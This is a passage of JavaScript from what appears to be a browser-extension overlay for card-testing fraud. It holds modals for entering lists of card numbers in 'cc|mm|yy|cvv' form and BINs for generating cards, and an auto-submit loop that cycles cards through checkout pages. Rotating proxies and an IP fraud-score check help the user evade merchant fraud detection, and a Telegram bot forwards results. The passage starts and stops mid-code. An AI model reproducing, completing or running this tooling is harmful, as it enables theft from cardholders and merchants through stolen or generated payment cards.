      <button class="music-btn" id="previewMusicBtn">▶️ Test</button>
    </div>
    <div class="custom-music-info hidden" id="customMusicInfo">
      <span class="music-filename" id="musicFilename">No file</span>
      <button class="music-remove-btn" id="removeMusicBtn">✕</button>
    </div>
  </div>
  <input type="file" id="musicFileInput" accept=".mp3,audio/mpeg" class="file-input-hidden">
  <div class="logout-container">
    <button class="action-btn logout-btn" id="logoutBtn">🚪 Logout</button>
  </div>
          </div>
        </div>
      </div>
    </div>
  `
    const ccModal = document.createElement("div")
    ccModal.className = "cc-modal hidden"
    ccModal.id = "ccModal"
    ccModal.innerHTML = `
    <div class="cc-modal-content">
      <div class="cc-modal-header">
        <span>📝 CC List (Max 20)</span>
        <button class="cc-modal-close" id="closeCcModal">✕</button>
      </div>
      <div class="cc-modal-body">
        <textarea id="ccTextarea" placeholder="Enter cards (one per line)&#10;Format: cc|mm|yy|cvv&#10;&#10;Example:&#10;4532110012345678|09|27|123&#10;4532110087654321|12|28|456"></textarea>
        <div class="cc-modal-info">
          <span id="ccCount">0</span>/20 cards
        </div>
      </div>
      <div class="cc-modal-footer">
        <button class="action-btn" id="clearCcList">Clear</button>
        <button class="action-btn primary-btn" id="saveCcList">💾 Save</button>
      </div>
    </div>
  `

    const bgInfoModal = document.createElement("div")
    bgInfoModal.className = "cc-modal hidden"
    bgInfoModal.id = "bgInfoModal"
    bgInfoModal.innerHTML = `
    <div class="cc-modal-content">
      <div class="cc-modal-header">
        <span>📱 BG Color Info</span>
        <button class="cc-modal-close" id="closeBgInfoModal">✕</button>
      </div>
      <div class="cc-modal-body bg-info-body">
        <div class="bg-info-icon">
          <span>⚠️</span>
        </div>
        <div class="bg-info-title">
          Background Color Only Works On Mobile Phone
        </div>
        <div class="bg-info-content">
          <div class="bg-info-box bg-info-warning">
            <div class="bg-info-box-title warning-text">❌ Not Working On:</div>
            <div>• Desktop / PC Browser</div>
            <div>• Laptop Browser</div>
          </div>
          <div class="bg-info-box bg-info-success">
            <div class="bg-info-box-title success-text">📱 For Phone Users:</div>
            <div>• Don't use Desktop Mode in browser</div>
            <div>• Use Mobile View for best results</div>
          </div>
        </div>
      </div>
      <div class="cc-modal-footer">
        <button class="action-btn primary-btn full-width-btn" id="bgInfoOkBtn">Okyy.!</button>
      </div>
    </div>
  `

    const proxyModal = document.createElement("div")
    proxyModal.className = "cc-modal hidden"
    proxyModal.id = "proxyModal"
    proxyModal.innerHTML = `
    <div class="cc-modal-content">
      <div class="cc-modal-header">
        <span id="proxyModalTitle">Proxy ${proxyString ? "Info" : "Setup"}</span>
        <button class="cc-modal-close" id="closeProxyModal">✕</button>
      </div>
      <div class="cc-modal-body" id="proxyModalBody">
        ${proxyString ? `
          <div class="proxy-info-display">
            <div class="proxy-info-row">
              <span class="proxy-info-label">Status:</span>
              <span class="proxy-info-value">
                <span class="success-text">Active</span>
              </span>
            </div>
            <div class="proxy-info-row">
              <span class="proxy-info-label">IP:</span>
              <span class="proxy-info-value">${proxyInfo.ip || 'N/A'}</span>
            </div>
            <div class="proxy-info-row">
              <span class="proxy-info-label">Country:</span>
              <span class="proxy-info-value">${proxyInfo.country_name || 'N/A'}${proxyInfo.country_code ? ' (' + proxyInfo.country_code + ')' : ''}</span>
            </div>
            <div class="proxy-info-row">
              <span class="proxy-info-label">Response:</span>
              <span class="proxy-info-value">${proxyInfo.response_time_ms ? proxyInfo.response_time_ms + 'ms' : 'N/A'}</span>
            </div>
            <div class="proxy-info-row">
              <span class="proxy-info-label">Type:</span>
              <span class="proxy-info-value">HTTP${proxyInfo.ip_type ? ' (' + proxyInfo.ip_type + ')' : ''}</span>
            </div>
            <div class="proxy-info-row">
              <span class="proxy-info-label">Proxy:</span>
              <span class="proxy-info-value proxy-masked">${obfuscateProxy(proxyString)}</span>
            </div>
          </div>
        ` : `
          <div class="proxy-setup-form">
            <div class="proxy-form-row">
              <label class="proxy-form-label">HTTP Proxies (One per line)</label>
              <textarea class="input-field proxy-input-resizable" id="proxyInput" placeholder="host:port:user:pass" rows="4"></textarea>
            </div>
            <div class="setting-row proxy-auto-rotate-row">
              <span class="setting-icon">AR</span>
              <span class="setting-label">Auto-Rotate Proxies</span>
              <label class="toggle-switch">
                <input type="checkbox" id="proxyAutoRotateToggle">
                <span class="toggle-slider"></span>
              </label>
            </div>
            <div class="proxy-format-hint">
              <div class="proxy-format-title">Supported Formats:</div>
              <div>- host:port:user:pass</div>
              <div>- user:pass@host:port</div>
              <div>- user:pass:host:port</div>
            </div>
          </div>
        `}
      </div>
      <div class="cc-modal-footer" id="proxyModalFooter">
        ${proxyString ? `
          <button class="action-btn danger-btn" id="proxyRemoveBtn">Remove</button>
        ` : `
          <button class="action-btn primary-btn" id="proxySaveBtn">Save</button>
        `}
      </div>
    </div>
  `

    const ipFraudModal = document.createElement("div")
    ipFraudModal.className = "cc-modal hidden ipfraud-modal"
    ipFraudModal.id = "ipFraudModal"
    ipFraudModal.innerHTML = `
    <div class="cc-modal-content">
      <div class="cc-modal-header">
        <span>IP Fraud Check</span>
        <div class="ipfraud-modal-actions">
          <button class="ipfraud-icon-btn" id="ipFraudSettingsBtn" title="Set IPQS key">CFG</button>
          <button class="ipfraud-icon-btn" id="ipFraudRefreshBtn" title="Refresh">R</button>
          <button class="cc-modal-close" id="closeIpFraudModal">X</button>
        </div>
      </div>
      <div class="cc-modal-body">
        <div class="ipfraud-top">
          <div class="ipfraud-ip-wrap">
            <div class="ipfraud-ip-row">
              <div class="ipfraud-ip blurred" id="ipFraudIp">Loading...</div>
              <button class="ipfraud-mini-btn" id="ipFraudToggleBtn" title="Show IP">IP</button>
            </div>
            <div class="ipfraud-source" id="ipFraudSource">Checking current IP...</div>
          </div>
          <div class="ipfraud-badge low" id="ipFraudBadge">LOW</div>
        </div>
        <div class="ipfraud-score-card">
          <div class="ipfraud-scorebar" id="ipFraudScorebar">
            <span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span>
          </div>
          <div class="ipfraud-score-meta">
            <span class="left">0</span>
            <span class="center" id="ipFraudScoreText">Score: --/100</span>
            <span class="right">100</span>
          </div>
        </div>
        <div class="ipfraud-details">
          <div class="ipfraud-row"><span class="ipfraud-label">Country</span><span class="ipfraud-value" id="ipFraudCountry">--</span></div>
          <div class="ipfraud-row"><span class="ipfraud-label">State</span><span class="ipfraud-value" id="ipFraudState">--</span></div>
          <div class="ipfraud-row"><span class="ipfraud-label">City</span><span class="ipfraud-value" id="ipFraudCity">--</span></div>
          <div class="ipfraud-row"><span class="ipfraud-label">ISP</span><span class="ipfraud-value" id="ipFraudIsp">--</span></div>
        </div>
        <div class="ipfraud-foot" id="ipFraudFoot">Provider: IPQualityScore. A default key is built in. Use CFG only if you want to replace it. ProxyCheck.io is used only as fallback.</div>
      </div>
    </div>
  `

    const tgConfigModal = document.createElement("div")
    tgConfigModal.className = "cc-modal hidden"
    tgConfigModal.id = "tgConfigModal"
    tgConfigModal.innerHTML = `
    <div class="cc-modal-content">
      <div class="cc-modal-header">
        <span>Telegram Forward</span>
        <button class="cc-modal-close" id="closeTgConfigModal">X</button>
      </div>
      <div class="cc-modal-body">
        <div class="kimlu-tg-forward-status" id="tgConfigStatusText"></div>
      </div>
      <div class="cc-modal-footer">
        <button class="action-btn" id="tgConfigTestBtn">Test</button>
        <button class="action-btn primary-btn" id="tgConfigSaveBtn">Save</button>
      </div>
    </div>
  `

    const binLibraryModal = document.createElement("div")
    binLibraryModal.className = "cc-modal hidden"
    binLibraryModal.id = "binLibraryModal"
    binLibraryModal.innerHTML = `
    <div class="cc-modal-content bin-library-modal">
      <div class="cc-modal-header">
        <div class="bin-library-header-top">
          <span class="bin-lib-title">📚 BIN Library</span>
          <button class="cc-modal-close" id="closeBinLibraryModal">✕</button>
        </div>
        <div class="bin-library-filter">
          <button class="bin-filter-btn active" id="binFilterAll">All</button>
          <button class="bin-filter-btn" id="binFilterTop">Top</button>
        </div>
      </div>
      <div class="cc-modal-body" id="binLibraryBody">
        <div class="bin-library-grid" id="binLibraryGrid">
          <!-- BIN cards will be inserted here -->
        </div>
      </div>
    </div>
  `

    document.body.appendChild(proxyModal)
    document.body.appendChild(bgInfoModal)
    document.body.appendChild(ipFraudModal)
    document.body.appendChild(tgConfigModal)
    document.body.appendChild(binLibraryModal)
    document.body.appendChild(ccModal)
    document.body.appendChild(overlay)
    overlay.addEventListener("click", (e) => {

      if (isMinimized && e.target === overlay) {

        const clickedElement = document.elementFromPoint(e.clientX, e.clientY)
        if (clickedElement && (
          clickedElement.tagName === 'BUTTON' ||
          clickedElement.classList.contains('music-toggle') ||
          clickedElement.closest('button') ||
          clickedElement.closest('.music-toggle')
        )) {
          return
        }
        toggleMinimize(e)
      }
    })
    setupLoginListeners()
    setupEventListeners(overlay)
    updateBinStatus()
    updateIdStatus()
    updateHistoryDisplay()
    updateStats()
    window.postMessage({ type: "GET_TOGGLE_STATES" }, "*")
    window.postMessage({ type: "GET_SAVED_BIN" }, "*")
    window.postMessage({ type: "GET_SAVED_ID" }, "*")
    window.postMessage({ type: "GET_LOGIN_STATE" }, "*")
    isCreatingOverlay = false
  }
  function setupEventListeners(overlay) {
    const enterBinBtn = document.getElementById("enterBinBtn")
    const autocoBtn = document.getElementById("autocoBtn")
    const minimizeBtn = document.getElementById("minimizeBtn")
    const addBinBtn = document.getElementById("addBinBtn")
    const switchBinBtn = document.getElementById("switchBinBtn")
    loadSavedBins()
    if (addBinBtn) {
      addBinBtn.addEventListener("click", () => {
        const container = document.getElementById("binInputsContainer")
        const existingInputs = container.querySelectorAll(".bin-input")
        if (existingInputs.length >= 7) {
          showWarning("⚠️ Maximum 7 BINs allowed", "error")
          return
        }
        const newRow = document.createElement("div")
        newRow.className = "bin-input-row"
        newRow.innerHTML = `
        <input type="text" class="input-field bin-input" placeholder="input bin" maxlength="30">
        <button class="remove-bin-btn" title="Remove">−</button>
      `
        container.appendChild(newRow)
        newRow.querySelector(".remove-bin-btn").addEventListener("click", () => {
          newRow.remove()
          // Persist remaining BINs
          const inputs = document.querySelectorAll(".bin-input")
          const remaining = Array.from(inputs).map(i => i.value.trim()).filter(b => b && b.length >= 6)
          if (remaining.length > 0) {
            saveBINs(remaining)
            currentBinIndex = Math.min(currentBinIndex, savedBINs.length - 1)
            updateBinStatus()
          }
          updateSwitchBtnVisibility()
        })
        updateSwitchBtnVisibility()
      })
    }
    if (switchBinBtn) {
      switchBinBtn.addEventListener("click", switchBin)
    }
    if (enterBinBtn) {
      enterBinBtn.addEventListener("click", () => {
        const inputs = document.querySelectorAll(".bin-input")
        const bins = []
        let hasError = false
        inputs.forEach((input) => {
          const bin = input.value.trim()
          if (bin) {

            const cardPart = bin.split("|")[0].replace(/[^0-9xX]/g, "")
            if (cardPart.length < 6) {
              showWarning("⚠️ BIN must be at least 6 digits", "error")
              hasError = true
              return
            }
            if (cardPart.length > 30) {
              showWarning("⚠️ Card number cannot be longer than 30 digits", "error")
              hasError = true
              return
            }
            bins.push(bin)
          }
        })
        if (hasError) return
        if (bins.length === 0) {
          showWarning("⚠️ Please enter at least one BIN", "error")
          return
        }
        saveBINs(bins)
        currentBinIndex = 0
        updateBinStatus()
        updateSwitchBtnVisibility()
        showWarning(`✅ ${bins.length} BIN${bins.length > 1 ? "s" : ""} saved!`)
      })
    }
    if (autocoBtn) {
      autocoBtn.addEventListener("click", () => {
        if (currentMode === "bin") {
          const bin = getSavedBIN()
          if (!bin) {
            showWarning("⚠️ Please enter BIN first.")
            return
          }
        } else {
          if (ccList.length === 0) {
            showWarning("⚠️ Please add CCs first.")
            return
          }
          currentCCIndex = 0
        }
        if (isAutoSubmitting) {
          stopAutoSubmit()
        } else {
          startAutoSubmit()
        }
      })
    }
    if (minimizeBtn) {
      minimizeBtn.addEventListener("click", (e) => {
        e.stopPropagation()
        toggleMinimize()
      })
    }

    const panelHeader = overlay.querySelector(".panel-header")
    if (panelHeader) {
      panelHeader.addEventListener("click", (e) => {
        e.stopPropagation()
      })
    }

    const modeBin = document.getElementById("modeBin")
    const modeCc = document.getElementById("modeCc")
    if (modeBin) {
      modeBin.addEventListener("click", () => setMode("bin"))
    }
    if (modeCc) {
      modeCc.addEventListener("click", () => setMode("cc"))
    }
    const openCcModal = document.getElementById("openCcModal")
    const closeCcModal = document.getElementById("closeCcModal")
    const saveCcList = document.getElementById("saveCcList")
    const clearCcList = document.getElementById("clearCcList")
    const ccTextarea = document.getElementById("ccTextarea")
    if (openCcModal) {
      openCcModal.addEventListener("click", () => {

        autoMinimizeForModal()

        const modal = document.getElementById("ccModal")
        modal.classList.remove("hidden")
        modal.offsetHeight
        modal.classList.add("show")
        if (ccTextarea && ccList.length > 0) {
          ccTextarea.value = ccList.join("\n")
        }
        updateCcCount()
      })
    }
    if (closeCcModal) {
      closeCcModal.addEventListener("click", () => {
        const modal = document.getElementById("ccModal")
        modal.classList.remove("show")
        setTimeout(() => {
          modal.classList.add("hidden")

          autoRestoreAfterModal()
        }, 400)
      })
    }
    if (ccTextarea) {
      ccTextarea.addEventListener("input", updateCcCount)
    }
    if (saveCcList) {
      saveCcList.addEventListener("click", saveCcListFunc)
    }
    if (clearCcList) {
      clearCcList.addEventListener("click", () => {
        if (ccTextarea) ccTextarea.value = ""
        updateCcCount()
      })
    }
    document.querySelectorAll(".collapsible-header").forEach((header) => {
      header.addEventListener("click", function (e) {
        e.preventDefault()
        e.stopPropagation()
        const contentId = this.id.replace("Toggle", "Content")
        const content = document.getElementById(contentId)
        const icon = this.querySelector(".collapse-icon")
        if (content && icon) {
          const isOpen = content.classList.contains("open")
          document.querySelectorAll(".collapsible-content.open").forEach((openContent) => {
            if (openContent !== content) {
              openContent.classList.remove("open")
              const otherHeader = openContent.previousElementSibling
              if (otherHeader) {
                otherHeader.classList.remove("active")
                const otherIcon = otherHeader.querySelector(".collapse-icon")
                if (otherIcon) otherIcon.classList.remove("icon-rotated")
              }
            }
          })
          if (isOpen) {
            content.classList.remove("open")
            this.classList.remove("active")
            icon.classList.remove("icon-rotated")
          } else {
            content.classList.add("open")
            this.classList.add("active")
            icon.classList.add("icon-rotated")
          }
        }
      })
    })
    const tgForwardToggle = document.getElementById("tgForwardToggle")
    const tgConfigOpenBtn = document.getElementById("tgConfigOpenBtn")
    const tgConfigModal = document.getElementById("tgConfigModal")
    const closeTgConfigModal = document.getElementById("closeTgConfigModal")
    const tgBotTokenInput = document.getElementById("tgBotTokenInput")
    const tgChatIdInput = document.getElementById("tgChatIdInput")
    const tgConfigStatusText = document.getElementById("tgConfigStatusText")
    const tgConfigTestBtn = document.getElementById("tgConfigTestBtn")
    const tgConfigSaveBtn = document.getElementById("tgConfigSaveBtn")
    const customNameInput = document.getElementById("customNameInput")
    const musicToggleBtn = document.getElementById("musicToggleBtn")
    const tgBotKey = (K && K.TG_BOT_TOKEN) || "kimtim_tg_bot_token"
    const tgChatKey = (K && K.TG_CHAT_ID) || "kimtim_tg_chat_id"
    let tgPopupNodes = null

    function ensureTelegramConfigPopup() {
      if (tgPopupNodes && tgPopupNodes.overlay && tgPopupNodes.overlay.isConnected) return tgPopupNodes

      const overlayEl = document.createElement("div")
      overlayEl.id = "kimluTgForwardOverlay"
      overlayEl.className = "kimlu-tg-forward-overlay"
      overlayEl.innerHTML = `
        <div class="kimlu-tg-forward-card">
          <div class="kimlu-tg-forward-header">
            <div class="kimlu-tg-forward-title">Telegram Forward</div>
            <button id="kimluTgForwardClose" class="kimlu-tg-forward-close">X</button>
          </div>
          <div class="kimlu-tg-forward-body">
            <div class="kimlu-tg-forward-field">
              <label class="kimlu-tg-forward-label">
                <span class="kimlu-tg-forward-badge">Bot</span>
                <span>Bot Token</span>
              </label>
              <input id="kimluTgForwardBot" class="kimlu-tg-forward-input" type="text" placeholder="123456789:ABCdefGHI...">
              <div class="kimlu-tg-forward-hint">Get from @BotFather on Telegram</div>
            </div>
            <div class="kimlu-tg-forward-field">
              <label class="kimlu-tg-forward-label">
                <span class="kimlu-tg-forward-badge">ID</span>
                <span>Chat ID</span>
              </label>
              <input id="kimluTgForwardChat" class="kimlu-tg-forward-input" type="text" placeholder="123456789">
              <div class="kimlu-tg-forward-hint">Get from @userinfobot on Telegram</div>
            </div>
            <div id="kimluTgForwardStatus" class="kimlu-tg-forward-status"></div>
          </div>
          <div class="kimlu-tg-forward-footer">
            <button id="kimluTgForwardTest" class="kimlu-tg-forward-btn test">Test</button>
            <button id="kimluTgForwardSave" class="kimlu-tg-forward-btn save">Save</button>
          </div>
        </div>
      `

      document.body.appendChild(overlayEl)

      tgPopupNodes = {
        overlay: overlayEl,
        close: overlayEl.querySelector("#kimluTgForwardClose"),
        bot: overlayEl.querySelector("#kimluTgForwardBot"),
        chat: overlayEl.querySelector("#kimluTgForwardChat"),
        status: overlayEl.querySelector("#kimluTgForwardStatus"),
        test: overlayEl.querySelector("#kimluTgForwardTest"),
        save: overlayEl.querySelector("#kimluTgForwardSave")
      }

      tgPopupNodes.close.addEventListener("click", closeTelegramConfigModal)
      overlayEl.addEventListener("click", (e) => {
        if (e.target === overlayEl) closeTelegramConfigModal()
      })

      return tgPopupNodes
    }

    function loadTelegramConfigInputs() {
      const nodes = ensureTelegramConfigPopup()
      if (nodes.bot) nodes.bot.value = localStorage.getItem(tgBotKey) || ""
      if (nodes.chat) nodes.chat.value = localStorage.getItem(tgChatKey) || ""
    }

    function setTgButtonsDisabled(disabled) {
      const nodes = ensureTelegramConfigPopup()
      if (nodes.test) nodes.test.disabled = disabled
      if (nodes.save) nodes.save.disabled = disabled
    }

    function setTgConfigStatus(message, type) {
      const nodes = ensureTelegramConfigPopup()
      if (!nodes.status) return
      nodes.status.textContent = message || ""
      nodes.status.className = "kimlu-tg-forward-status" + (type ? " " + type : "")
    }

    function closeTelegramConfigModal() {
      const nodes = ensureTelegramConfigPopup()
      nodes.overlay.classList.remove("active")
      autoRestoreAfterModal()
    }

    if (tgConfigOpenBtn) {
      tgConfigOpenBtn.addEventListener("click", (e) => {
        e.preventDefault()
        e.stopPropagation()
        autoMinimizeForModal()
        loadTelegramConfigInputs()
        setTgConfigStatus("")
        const nodes = ensureTelegramConfigPopup()
        nodes.overlay.classList.add("active")
      })
    }

    if (closeTgConfigModal) {
      closeTgConfigModal.addEventListener("click", closeTelegramConfigModal)
    }

    if (tgConfigModal) {
      tgConfigModal.addEventListener("click", (e) => {
        if (e.target === tgConfigModal) closeTelegramConfigModal()
      })
    }

    if (tgConfigSaveBtn) {
      tgConfigSaveBtn.addEventListener("click", () => {
        const nodes = ensureTelegramConfigPopup()
        const botToken = nodes.bot ? nodes.bot.value.trim() : ""
        const chatId = nodes.chat ? nodes.chat.value.trim() : ""

        if (!botToken && !chatId) {
          localStorage.removeItem(tgBotKey)
          localStorage.removeItem(tgChatKey)
          saveToGlobalStorage(tgBotKey, "")
          saveToGlobalStorage(tgChatKey, "")
          setTgConfigStatus("Telegram config cleared.", "success")
          showWarning("Telegram config cleared", "info")
          return
        }

        if (!botToken || !chatId) {
          setTgConfigStatus("Enter both Bot Token and Chat ID.", "error")
          return
        }

        localStorage.setItem(tgBotKey, botToken)
        localStorage.setItem(tgChatKey, chatId)
        saveToGlobalStorage(tgBotKey, botToken)
        saveToGlobalStorage(tgChatKey, chatId)
        setTgConfigStatus("Telegram config saved.", "success")
        showWarning("Telegram config saved", "success")
      })
    }

    if (tgConfigTestBtn) {
      tgConfigTestBtn.addEventListener("click", async () => {
        const nodes = ensureTelegramConfigPopup()
        const botToken = nodes.bot ? nodes.bot.value.trim() : ""
        const chatId = nodes.chat ? nodes.chat.value.trim() : ""

        if (!botToken || !chatId) {
          setTgConfigStatus("Enter both Bot Token and Chat ID.", "error")
          return
        }

        setTgButtonsDisabled(true)
        setTgConfigStatus("Sending test message...", "")
        try {
          const response = await sendToBackground({
            type: "TEST_TELEGRAM_CONFIG",
            payload: { botToken, chatId }
          })
          if (response && response.success) {
            setTgConfigStatus("Test message sent successfully.", "success")
            showWarning("Telegram test sent", "success")
          } else {
            setTgConfigStatus((response && response.error) || "Telegram test failed.", "error")
          }
        } catch (e) {
          setTgConfigStatus(e && e.message ? e.message : "Telegram test failed.", "error")
        } finally {
          setTgButtonsDisabled(false)
        }
      })
    }

    if (tgForwardToggle) {
      tgForwardToggle.addEventListener("change", function () {
        tgForwardEnabled = this.checked
        localStorage.setItem(K.TOGGLE_TG_FORWARD, tgForwardEnabled)
      })
    }
    if (customNameInput) {
      customNameInput.addEventListener("input", function () {
        saveCustomName(this.value.trim())
      })
    }
    const customEmailInput = document.getElementById("customEmailInput")
    if (customEmailInput) {
      customEmailInput.addEventListener("input", function () {
        saveCustomEmail(this.value.trim())
      })
    }

    function showProxyModal() {
      const modal = document.getElementById("proxyModal")
      if (modal) {
        updateProxyModalContent()
        modal.classList.remove("hidden")
      }
    }

    function updateProxyModalContent() {
      const modalTitle = document.getElementById("proxyModalTitle")
      const modalBody = document.getElementById("proxyModalBody")
      const modalFooter = document.getElementById("proxyModalFooter")
      const hasProxyList = Array.isArray(proxyList) && proxyList.length > 0

      if (hasProxyList) {

        if (modalTitle) modalTitle.textContent = "Proxy Info"
        if (modalBody) {
          const proxyRows = proxyList.map((item, index) => {
            const current = item && item.string === proxyString
            const label = current ? "Current" : ("Proxy " + (index + 1))
            const proxyText = obfuscateProxy(item && item.string ? item.string : "")
            const ipText = item && item.info && item.info.ip ? item.info.ip : "IP unknown"
            return `
            <div class="proxy-list-row" data-proxy-index="${index}">
              <div class="proxy-list-main">
                <div class="proxy-list-head">
                  <span class="proxy-list-tag ${current ? "current" : ""}">${label}</span>
                  <span class="proxy-list-proxy">${proxyText}</span>
                </div>
                <div class="proxy-list-status" id="proxyFraudStatus-${index}">${ipText}</div>
              </div>
              <div class="proxy-list-actions">
                <button class="action-btn proxy-mini-btn proxy-check-btn" data-proxy-index="${index}">Check</button>
                <button class="action-btn danger-btn proxy-mini-btn proxy-remove-one-btn" data-proxy-index="${index}">Remove</button>
              </div>
            </div>
          `
          }).join("")

          modalBody.innerHTML = `
          <div class="proxy-info-display">
            <div class="proxy-info-row">
              <span class="proxy-info-label">List:</span>
              <span class="proxy-info-value proxy-count-accent">${proxyList ? proxyList.length : 0} proxies ${proxyAutoRotate ? '(Auto-Rotate ON)' : ''}</span>
            </div>
            <div class="proxy-info-row">
              <span class="proxy-info-label">Current:</span>
              <span class="proxy-info-value proxy-masked">${obfuscateProxy(proxyString)}</span>
            </div>
            <div class="proxy-info-row">
              <span class="proxy-info-label">Status:</span>
              <span class="proxy-info-value">
                <span class="success-text">● Active</span>
              </span>
            </div>
            <div class="proxy-info-row">
              <span class="proxy-info-label">IP:</span>
              <span class="proxy-info-value">${proxyInfo.ip || 'N/A'}</span>
            </div>
            <div class="proxy-info-row">
              <span class="proxy-info-label">Country:</span>
              <span class="proxy-info-value">${proxyInfo.country_name || 'N/A'}${proxyInfo.country_code ? ' (' + proxyInfo.country_code + ')' : ''}</span>
            </div>
            <div class="proxy-info-row">
              <span class="proxy-info-label">Response:</span>
              <span class="proxy-info-value">${proxyInfo.response_time_ms ? proxyInfo.response_time_ms + 'ms' : 'N/A'}</span>
            </div>
          </div>
          <div class="proxy-list-wrap">
            ${proxyRows}
          </div>
        `
        }
        if (modalFooter) {
          modalFooter.innerHTML = `
          <button class="action-btn" id="proxyCheckAllBtn">Check All Fraud</button>
          <button class="action-btn danger-btn" id="proxyRemoveBtn">Remove</button>
        `
        }
      } else {

        if (modalTitle) modalTitle.textContent = "Set Proxy"
        if (modalBody) {
          modalBody.innerHTML = `
          <div class="proxy-setup-form">
            <div class="proxy-form-row">
              <label class="proxy-form-label">HTTP Proxies (One per line)</label>
              <textarea class="input-field proxy-input-resizable" id="proxyInput" placeholder="host:port:user:pass" rows="4"></textarea>
            </div>
            <div class="setting-row proxy-auto-rotate-row">
              <span class="setting-icon">AR</span>
              <span class="setting-label">Auto-Rotate Proxies</span>
              <label class="toggle-switch">
                <input type="checkbox" id="proxyAutoRotateToggle">
                <span class="toggle-slider"></span>
              </label>
            </div>
            <div class="proxy-format-hint">
              <div class="proxy-format-title">Supported Formats:</div>
              <div>• host:port:user:pass</div>
              <div>• user:pass@host:port</div>
              <div>• user:pass:host:port</div>
            </div>
          </div>
        `
        }
        if (modalFooter) {
          modalFooter.innerHTML = `
          <button class="action-btn primary-btn" id="proxySaveBtn">Save</button>
        `
        }
      }

      setupProxyModalListeners()
    }

    function updateProxyViewBtn() {
      const btn = document.getElementById("proxyViewBtn")
      if (btn) {
        const hasProxyList = Array.isArray(proxyList) && proxyList.length > 0
        btn.textContent = (proxyString || hasProxyList) ? "View" : "Set"
      }
    }

    function clampIpFraudScore(score) {
      score = parseInt(score, 10)
      if (isNaN(score)) score = 0
      if (score < 0) return 0
      if (score > 100) return 100
      return score
    }

    function getIpFraudRiskClass(score) {
      score = clampIpFraudScore(score)
      if (score >= 75) return "very-high"
      if (score >= 50) return "high"
      if (score >= 25) return "medium"
      return "low"
    }

    function getIpFraudRiskLabel(score) {
      const riskClass = getIpFraudRiskClass(score)
      if (riskClass === "very-high") return "VERY HIGH"
      if (riskClass === "high") return "HIGH"
      if (riskClass === "medium") return "MEDIUM"
      return "LOW"
    }

    function setIpFraudLoading() {
      const ipEl = document.getElementById("ipFraudIp")
      const badgeEl = document.getElementById("ipFraudBadge")
      const scoreTextEl = document.getElementById("ipFraudScoreText")
      const sourceEl = document.getElementById("ipFraudSource")
      const countryEl = document.getElementById("ipFraudCountry")
      const stateEl = document.getElementById("ipFraudState")
      const cityEl = document.getElementById("ipFraudCity")
      const ispEl = document.getElementById("ipFraudIsp")
      const footEl = document.getElementById("ipFraudFoot")

      if (ipEl) {
        ipEl.textContent = "Loading..."
        ipEl.classList.add("blurred")
      }
      if (badgeEl) {
        badgeEl.textContent = "..."
        badgeEl.className = "ipfraud-badge low"
      }
      if (scoreTextEl) scoreTextEl.textContent = "Score: --/100"
      if (sourceEl) sourceEl.textContent = "Checking current IP..."
      if (countryEl) countryEl.textContent = "--"
      if (stateEl) stateEl.textContent = "--"
      if (cityEl) cityEl.textContent = "--"
      if (ispEl) ispEl.textContent = "--"
      if (footEl) footEl.textContent = "Provider: IPQualityScore. A default key is built in. Use CFG only if you want to replace it. ProxyCheck.io is used only as fallback."
      paintIpFraudScore(0, "low")
    }

    function paintIpFraudScore(score, riskClass) {
      const scoreBar = document.getElementById("ipFraudScorebar")
      if (!scoreBar) return
      const bars = scoreBar.querySelectorAll("span")
      const activeBars = Math.max(1, Math.ceil(clampIpFraudScore(score) / 10))
      bars.forEach((bar, index) => {
        bar.className = index < activeBars ? "active " + riskClass : ""
      })
    }

    function renderIpFraudResult(data) {
      const score = clampIpFraudScore(data.score)
      const riskClass = getIpFraudRiskClass(score)
      const ipEl = document.getElementById("ipFraudIp")
      const badgeEl = document.getElementById("ipFraudBadge")
      const scoreTextEl = document.getElementById("ipFraudScoreText")
      const sourceEl = document.getElementById("ipFraudSource")
      const countryEl = document.getElementById("ipFraudCountry")
      const stateEl = document.getElementById("ipFraudState")
      const cityEl = document.getElementById("ipFraudCity")
      const ispEl = document.getElementById("ipFraudIsp")
      const footEl = document.getElementById("ipFraudFoot")

      if (ipEl) ipEl.textContent = data.ip || "N/A"
      if (badgeEl) {
        badgeEl.textContent = getIpFraudRiskLabel(score)
        badgeEl.className = "ipfraud-badge " + riskClass
      }
      if (scoreTextEl) scoreTextEl.textContent = `Score: ${score}/100`
      if (sourceEl) sourceEl.textContent = `Source: ${data.source || "ipqualityscore"}`
      if (countryEl) countryEl.textContent = data.country || "N/A"
      if (stateEl) stateEl.textContent = data.state || "N/A"
      if (cityEl) cityEl.textContent = data.city || "N/A"
      if (ispEl) ispEl.textContent = data.isp || "N/A"

      const signals = []
      if (data.is_proxy) signals.push("Proxy")
      if (data.is_vpn) signals.push("VPN")
      if (data.is_tor) signals.push("Tor")
      if (data.is_datacenter) signals.push("Datacenter")
      if (data.is_abuser) signals.push("Abuser")
      if (footEl) footEl.textContent = data.notes || (signals.length ? "Signals: " + signals.join(", ") : "No elevated fraud indicators were returned.")

      paintIpFraudScore(score, riskClass)
    }

    function renderIpFraudError(message) {
      const ipEl = document.getElementById("ipFraudIp")
      const badgeEl = document.getElementById("ipFraudBadge")
      const scoreTextEl = document.getElementById("ipFraudScoreText")
      const sourceEl = document.getElementById("ipFraudSource")
      const footEl = document.getElementById("ipFraudFoot")

      if (ipEl) {
        ipEl.textContent = "Unavailable"
        ipEl.classList.remove("blurred")
      }
      if (badgeEl) {
        badgeEl.textContent = "ERROR"
        badgeEl.className = "ipfraud-badge error"
      }
      if (scoreTextEl) scoreTextEl.textContent = "Score: --/100"
      if (sourceEl) sourceEl.textContent = "Source: request failed"
      if (footEl) footEl.textContent = message || "Unable to check fraud score."
      paintIpFraudScore(0, "low")
    }

    async function resolveIpFraudTargetIp() {
      syncProxyFromModule()

      if (proxyEnabled && proxyString) {
        const liveResult = await checkProxyLive(proxyString)
        if (!liveResult || !liveResult.success || !liveResult.proxy_ip) {
          throw new Error((liveResult && liveResult.error) || "Failed to resolve proxy IP")
        }

        proxyInfo = {
          ip: liveResult.proxy_ip || "",
          response_time_ms: liveResult.response_time_ms || 0,
          country_name: liveResult.country_name || "",
          country_code: liveResult.country_code || "",
          ip_type: liveResult.ip_type || ""
        }
        saveProxySettings()
        updateBottomIpBar(proxyInfo.ip || "", true)

        return {
          ip: liveResult.proxy_ip,
          viaProxy: true
        }
      }

      if (proxyInfo && proxyInfo.ip) {
        return {
          ip: proxyInfo.ip,
          viaProxy: false
        }
      }

      const ipResult = await sendToBackground({ type: "FETCH_REAL_IP" })
      if (!ipResult || !ipResult.success || !ipResult.ip) {
